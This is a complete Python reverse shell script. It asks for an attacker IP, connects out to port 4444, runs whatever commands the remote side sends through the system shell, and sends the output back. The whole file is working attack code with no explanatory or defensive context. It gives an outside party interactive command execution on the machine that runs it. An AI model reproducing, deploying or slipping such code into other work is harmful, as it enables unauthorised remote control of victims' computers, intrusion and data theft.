import socket
import subprocess
import os

ATTACKER_IP = str(input("Enter the attacker ip"))
ATTACKER_PORT = 4444

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, ATTACKER_PORT))

    while True:
        command = s.recv(1024).decode('utf-8')

        if command.lower() == 'exit':
            break

        elif command[:2] == 'cd':
            try:
                os.chdir(command[3:])
                s.send(b"Directory changed\n")
            except Exception as e:
                s.send(f"Failed to change directory: {str(e)}\n".encode('utf-8'))

        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                s.send(output)
            except subprocess.CalledProcessError as e:
                s.send(str(e).encode('utf-8'))

    s.close()

if __name__ == "__main__":
    connect()
